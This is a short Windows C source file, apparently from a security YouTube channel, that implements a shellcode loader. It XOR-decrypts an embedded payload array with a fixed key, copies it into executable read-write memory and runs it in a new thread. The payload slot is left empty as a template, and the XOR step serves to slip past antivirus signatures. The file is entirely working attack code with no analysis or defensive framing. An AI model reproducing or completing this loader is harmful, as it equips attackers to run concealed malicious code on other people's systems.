# Gemini Cyber Security @ https://www.youtube.com/@gemini_security #

#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
if (argc == 2) {
	unsigned char shellcode[] = "";
  char key[] = "secret";

	unsigned int data_len = sizeof(shellcode);
	unsigned int key_len = sizeof(key);

	int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;

                shellcode[i] = shellcode[i] ^ key[j];
                j++;
        }

	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	MoveMemory(alloc_mem, shellcode, sizeof(shellcode));

	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	WaitForSingleObject(tHandle, INFINITE);

	return 0;
}
}
